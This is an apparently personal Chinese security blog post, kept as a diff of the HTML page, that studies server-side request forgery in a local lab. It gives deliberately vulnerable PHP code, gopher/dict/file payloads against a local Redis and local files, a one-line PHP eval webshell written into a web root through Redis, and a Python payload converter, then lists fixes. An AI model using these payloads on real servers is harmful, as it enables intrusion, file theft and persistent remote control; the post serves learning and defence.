@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ssrf 漏洞学习 | Damit5&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="damit5" />
+  
+  
+  
+  
+  <meta name="description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer10&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;https://da">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF 漏洞学习">
+<meta property="og:url" content="https://damit5.com/2018/05/26/SSRF-漏洞学习/index.html">
+<meta property="og:site_name" content="Damit5&#39;s Blog">
+<meta property="og:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer10&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;https://da">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://damit5.com/2018/05/26/SSRF-漏洞学习/img/1.png">
+<meta property="og:image" content="https://damit5.com/2018/05/26/SSRF-漏洞学习/img/2.png">
+<meta property="og:image" content="https://damit5.com/2018/05/26/SSRF-漏洞学习/img/3.png">
+<meta property="og:updated_time" content="2018-05-26T08:33:41.826Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF 漏洞学习">
+<meta name="twitter:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer10&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;https://da">
+<meta name="twitter:image" content="https://damit5.com/2018/05/26/SSRF-漏洞学习/img/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/favicon.png">
+  <link rel="apple-touch-icon" href="/css/images/favicon.png">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/favicon.png">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/About">About</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/Link">link</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="index.search"><button type="submit" class="search-form-submit"> </button><input type="hidden" name="sitesearch" value="https://damit5.com"></form>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-SSRF-漏洞学习" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      SSRF 漏洞学习
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/05/26/SSRF-漏洞学习/" class="article-date">
+	  <time datetime="2018-05-26T08:31:58.000Z" itemprop="datePublished">2018-05-26</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer10" class="aplayer" style="margin-bottom: 20px;"></div>
+		<script>
+			new APlayer({
+				element: document.getElementById("aplayer10"),
+				narrow: false,
+				autoplay: true,
+				showlrc: 0,
+				music: {
+					title: "六月的雨",
+					author: "胡歌",
+					url: "https://damit5.github.io/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
+					pic: "https://damit5.github.io/Music/233.jpg",
+				}
+			});
+		</script>
+<h2 id="0x01-SSRF-概述"><a href="#0x01-SSRF-概述" class="headerlink" title="0x01 SSRF 概述"></a>0x01 SSRF 概述</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<a id="more"></a>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><h3 id="环境内容"><a href="#环境内容" class="headerlink" title="环境内容"></a>环境内容</h3><table>
+<thead>
+<tr>
+<th>应用</th>
+<th>版本</th>
+<th>端口号</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PhpStudy</td>
+<td>php5.4.45+Apache</td>
+<td>80</td>
+</tr>
+<tr>
+<td>Redis</td>
+<td>3.0.501</td>
+<td>6379</td>
+</tr>
+</tbody>
+</table>
+<h3 id="漏洞代码-ssrf-php"><a href="#漏洞代码-ssrf-php" class="headerlink" title="漏洞代码 ssrf.php"></a>漏洞代码 <code>ssrf.php</code></h3><p>此代码用来模拟SSRF，使用curl发起网络请求后返回客户端，请求加载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$ch = curl_init();</div><div class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]);</div><div class="line">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</div><div class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</div><div class="line">curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>上面的漏洞代码<code>ssrf.php</code>没有屏蔽回显，所以利用姿势比较多</p>
+</blockquote>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p><strong>gopher</strong>：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。</p>
+<p><strong>公网IP的VPS监听 <code>2333</code> 端口</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@host ~]# nc -lvp 2333</div><div class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</div><div class="line">Ncat: Listening on :::2333</div><div class="line">Ncat: Listening on 0.0.0.0:2333</div></pre></td></tr></table></figure>
+<p><strong>利用 gopher 协议访问</strong></p>
+<p>浏览器直接访问或者用 <code>curl url</code></p>
+<p><code>http://127.0.0.1/ssrf.php?url=gopher://66.112.213.76:2333/_hello</code></p>
+<p><strong>收到回显</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@host ~]# nc -lvp 2333</div><div class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</div><div class="line">Ncat: Listening on :::2333</div><div class="line">Ncat: Listening on 0.0.0.0:2333</div><div class="line">Ncat: Connection from 183.xxx.xxx.xxx.</div><div class="line">Ncat: Connection from 183.xxx.xxx.xxx:9661.</div><div class="line">hello</div></pre></td></tr></table></figure></p>
+<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>因为此处 <code>ssrf.php</code> 的漏洞代码有回显，所以浏览器直接访问</p>
+<p><code>http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info</code></p>
+<p>或者终端</p>
+<p><code>curl http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info</code></p>
+<p>可以获取Redis的配置信息</p>
+<p><img src="img/1.png" alt="Redis 配置"></p>
+<p>同理也可以添加或者查看Redis的信息</p>
+<p>查看Redis存储的内容</p>
+<p><img src="img/2.png" alt="获取Redis目录"></p>
+<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>利用 <code>file</code> 协议可以读取任意内容</p>
+<p>前提也是在有回显的情况下</p>
+<p><code>http://127.0.0.1/ssrf.php?url=file:///c:\Users\h\Desktop\hello.txt</code></p>
+<p><img src="img/3.png" alt="读取hello.txt文件内容"></p>
+<h3 id="http-s"><a href="#http-s" class="headerlink" title="http/s"></a>http/s</h3><p>探测内网主机存活</p>
+<h2 id="0x04-攻击Redis"><a href="#0x04-攻击Redis" class="headerlink" title="0x04 攻击Redis"></a>0x04 攻击Redis</h2><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><h4 id="生成gopher协议的payload"><a href="#生成gopher协议的payload" class="headerlink" title="生成gopher协议的payload"></a>生成gopher协议的payload</h4><ul>
+<li>端口转发</li>
+</ul>
+<p><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></p>
+<ul>
+<li>Redis连接4444端口</li>
+</ul>
+<p><code>redis-cli -p 4444</code></p>
+<p>输入对应的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set shell &quot;&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;&quot;</div><div class="line">config set dir /var/www/html/   # 此时在linux服务器上测试</div><div class="line">config set dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure>
+<p>可以在socat界面看到数据包</p>
+<p>大概长这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&gt; 2018/05/26 15:56:25.163014  length=63 from=17 to=79</div><div class="line">*3\r</div><div class="line">$3\r</div><div class="line">set\r</div><div class="line">$5\r</div><div class="line">shell\r</div><div class="line">$32\r</div><div class="line">x&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;\r</div><div class="line">&lt; 2018/05/26 15:56:25.163312  length=5 from=10163 to=10167</div><div class="line">+OK\r</div><div class="line">&gt; 2018/05/26 15:56:33.773190  length=55 from=80 to=134</div><div class="line">*4\r</div><div class="line">$6\r</div><div class="line">config\r</div><div class="line">$3\r</div><div class="line">set\r</div><div class="line">$3\r</div><div class="line">dir\r</div><div class="line">$14\r</div><div class="line">/var/www/html/\r</div></pre></td></tr></table></figure>
+<ul>
+<li>利用脚本转换为<code>gopher</code>协议可以利用的payload</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line"></div><div class="line">exp = &apos;&apos;</div><div class="line"></div><div class="line">with open(sys.argv[1]) as f:</div><div class="line">    for line in f.readlines():</div><div class="line">        if line[0] in &apos;&gt;&lt;+&apos;:</div><div class="line">            continue</div><div class="line">        # 判断倒数第2、3字符串是否为\r</div><div class="line">        elif line[-3:-1] == r&apos;\r&apos;:</div><div class="line">            # 如果该行只有\r，将\r替换成%0a%0d%0a</div><div class="line">            if len(line) == 3:</div><div class="line">                exp = exp + &apos;%0a%0d%0a&apos;</div><div class="line">            else:</div><div class="line">                line = line.replace(r&apos;\r&apos;, &apos;%0d%0a&apos;)</div><div class="line">                # 去掉最后的换行符</div><div class="line">                line = line.replace(&apos;\n&apos;, &apos;&apos;)</div><div class="line">                exp = exp + line</div><div class="line">        # 判断是否是空行，空行替换为%0a</div><div class="line">        elif line == &apos;\x0a&apos;:</div><div class="line">            exp = exp + &apos;%0a&apos;</div><div class="line">        else:</div><div class="line">            line = line.replace(&apos;\n&apos;, &apos;&apos;)</div><div class="line">            exp = exp + line</div><div class="line">print exp</div></pre></td></tr></table></figure>
+<h4 id="测试脚本是否可用"><a href="#测试脚本是否可用" class="headerlink" title="测试脚本是否可用"></a>测试脚本是否可用</h4><p><code>curl -v &#39;gopher://127.0.0.1:6379/_生成的exp</code></p>
+<h4 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h4><p>我在复现的时候，不知道哪儿出了问题，一直报错 <code>curl: (3) [globbing] illegal character in range specification at pos 87</code></p>
+<h2 id="0x05-可能存在漏洞的地方"><a href="#0x05-可能存在漏洞的地方" class="headerlink" title="0x05 可能存在漏洞的地方"></a>0x05 可能存在漏洞的地方</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">share    </div><div class="line">wap    </div><div class="line">url    </div><div class="line">link    </div><div class="line">src    </div><div class="line">source    </div><div class="line">target    </div><div class="line">u    </div><div class="line">3g    </div><div class="line">display    </div><div class="line">sourceURl    </div><div class="line">imageURL    </div><div class="line">domain</div></pre></td></tr></table></figure>
+<h2 id="0x06-修复方案"><a href="#0x06-修复方案" class="headerlink" title="0x06 修复方案"></a>0x06 修复方案</h2><ul>
+<li>限制协议为HTTP、HTTPS</li>
+<li>禁止30x跳转</li>
+<li>设置URL白名单或者限制内网IP</li>
+</ul>
+<h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><h3 id="SSRF-in-PHP"><a href="#SSRF-in-PHP" class="headerlink" title="SSRF in PHP"></a>SSRF in PHP</h3><blockquote>
+<p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="external">https://joychou.org/web/phpssrf.html</a></p>
+</blockquote>
+<h3 id="SSRF漏洞分析与利用"><a href="#SSRF漏洞分析与利用" class="headerlink" title="SSRF漏洞分析与利用"></a>SSRF漏洞分析与利用</h3><blockquote>
+<p><a href="http://www.91ri.org/17111.html" target="_blank" rel="external">http://www.91ri.org/17111.html</a></p>
+</blockquote>
+<h3 id="利用-gopher-协议拓展攻击面"><a href="#利用-gopher-协议拓展攻击面" class="headerlink" title="利用 gopher 协议拓展攻击面"></a>利用 gopher 协议拓展攻击面</h3><blockquote>
+<p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p>
+</blockquote>
+<h3 id="SSRF-详解"><a href="#SSRF-详解" class="headerlink" title="SSRF 详解"></a>SSRF 详解</h3><blockquote>
+<p><a href="https://blog.csdn.net/qq_30135181/article/details/52734225" target="_blank" rel="external">https://blog.csdn.net/qq_30135181/article/details/52734225</a></p>
+</blockquote>
+<h3 id="SSRF漏洞-原理-amp-绕过姿势"><a href="#SSRF漏洞-原理-amp-绕过姿势" class="headerlink" title="SSRF漏洞(原理&amp;绕过姿势)"></a>SSRF漏洞(原理&amp;绕过姿势)</h3><blockquote>
+<p><a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="external">https://www.t00ls.net/articles-41070.html</a></p>
+</blockquote>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><blockquote>
+<p><a href="https://www.jianshu.com/p/ad7b8079e0d5" target="_blank" rel="external">https://www.jianshu.com/p/ad7b8079e0d5</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/05/18/Redis未授权访问漏洞利用/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Redis未授权访问漏洞利用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-SSRF-概述"><span class="nav-number">1.</span> <span class="nav-text">0x01 SSRF 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-环境搭建"><span class="nav-number">2.</span> <span class="nav-text">0x02 环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境内容"><span class="nav-number">2.1.</span> <span class="nav-text">环境内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞代码-ssrf-php"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞代码 ssrf.php</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">0x03 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher"><span class="nav-number">3.1.</span> <span class="nav-text">gopher</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict"><span class="nav-number">3.2.</span> <span class="nav-text">dict</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file"><span class="nav-number">3.3.</span> <span class="nav-text">file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http-s"><span class="nav-number">3.4.</span> <span class="nav-text">http/s</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-攻击Redis"><span class="nav-number">4.</span> <span class="nav-text">0x04 攻击Redis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#写入webshell"><span class="nav-number">4.1.</span> <span class="nav-text">写入webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#生成gopher协议的payload"><span class="nav-number">4.1.1.</span> <span class="nav-text">生成gopher协议的payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试脚本是否可用"><span class="nav-number">4.1.2.</span> <span class="nav-text">测试脚本是否可用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PS"><span class="nav-number">4.1.3.</span> <span class="nav-text">PS</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-可能存在漏洞的地方"><span class="nav-number">5.</span> <span class="nav-text">0x05 可能存在漏洞的地方</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-修复方案"><span class="nav-number">6.</span> <span class="nav-text">0x06 修复方案</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-参考文章"><span class="nav-number">7.</span> <span class="nav-text">0x07 参考文章</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-in-PHP"><span class="nav-number">7.1.</span> <span class="nav-text">SSRF in PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF漏洞分析与利用"><span class="nav-number">7.2.</span> <span class="nav-text">SSRF漏洞分析与利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-gopher-协议拓展攻击面"><span class="nav-number">7.3.</span> <span class="nav-text">利用 gopher 协议拓展攻击面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-详解"><span class="nav-number">7.4.</span> <span class="nav-text">SSRF 详解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF漏洞-原理-amp-绕过姿势"><span class="nav-number">7.5.</span> <span class="nav-text">SSRF漏洞(原理&绕过姿势)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-number">7.6.</span> <span class="nav-text">SSRF</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2017 - 2018 Damit5&#39;s Blog All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/About" class="mobile-nav-link">About</a>
+  
+    <a href="/Link" class="mobile-nav-link">Link</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            Damit5&#39;s Blog
+          </div>
+          <div class="panel-body">
+            Copyright © 2018 Damit 5 All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
